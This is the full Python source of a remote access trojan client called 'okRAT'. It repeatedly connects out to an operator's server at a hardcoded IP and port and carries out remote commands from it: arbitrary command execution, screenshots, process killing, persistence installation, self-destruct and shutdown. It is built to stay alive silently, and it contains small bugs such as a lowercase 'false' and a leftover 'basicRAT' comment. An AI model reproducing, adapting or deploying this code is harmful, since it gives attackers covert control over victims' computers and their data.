#!/usr/bin/env python

#
# okRAT client
#
import argparse
import socket
import sys
import time
import struct
import pickle
from core import *


# change these to suit your needs
HOST = '192.168.43.140'
PORT = 1337

# seconds to wait before client will attempt to reconnect
CONN_TIMEOUT = 10

# determine system platform
if sys.platform.startswith('win'):
    PLAT = 'win'
elif sys.platform.startswith('linux'):
    PLAT = 'nix'
elif sys.platform.startswith('darwin'):
    PLAT = 'mac'
else:
    print 'This platform is not supported.'
    sys.exit(1)


def sender(conn, data_to_send):
    if not data_to_send:
        data_to_send = 'Ok (no output)'
    conn.send(bytes(len(data_to_send)))
    time.sleep(1)
    conn.send(bytes(data_to_send))
    return True


def receiver(conn):
    length = conn.recv(1024)
    expected_length = int(length)
    received_data = ''
    while len(received_data) < expected_length:
        received_data += conn.recv(1024)
    return received_data


def client_loop(conn):
    while True:
        results = ''
        data = receiver(conn)

        # seperate data into command and action
        cmd, _, action = data.partition(' ')

        if cmd == 'kill':
            conn.close()
            return 1

        elif cmd == 'selfdestruct':
            conn.close()
            toolkit.selfdestruct(PLAT)

        elif cmd == 'quit':
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break

        elif cmd == 'persistence':
            results = persistence.run(PLAT)

        elif cmd == 'execute':
            results = toolkit.execute(action)

        elif cmd == 'screenshot':
            results = toolkit.screenshot()

        elif cmd == 'listprocesses':
            results = toolkit.listprocesses()

        elif cmd == 'killprocess':
            results = toolkit.killprocess(action)

        elif cmd == 'shutdown':
            results = toolkit.shutdown(false)

        elif cmd == 'restart':
            results = toolkit.shutdown(True)

        elif cmd == 'pwd':
            results = toolkit.pwd()

        results = results.rstrip()

        sender(conn, results)

def get_parser():
    parser = argparse.ArgumentParser(description='okRAT server')
    parser.add_argument('--host', help='HOST to listen on.',
                        default='localhost')
    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    HOST = args['host']
    print(HOST)
    exit_status = 0

    while True:
        conn = socket.socket()

        try:
            # attempt to connect to basicRAT server
            conn.connect((HOST, PORT))
        except socket.error:
            time.sleep(CONN_TIMEOUT)
            continue

        # This try/except statement makes the client very resilient, but it's
        # horrible for debugging. It will keep the client alive if the server
        # is torn down unexpectedly, or if the client freaks out.
        try:
            exit_status = client_loop(conn)
        except:
            pass

        if exit_status:
            sys.exit(0)


if __name__ == '__main__':
    main()
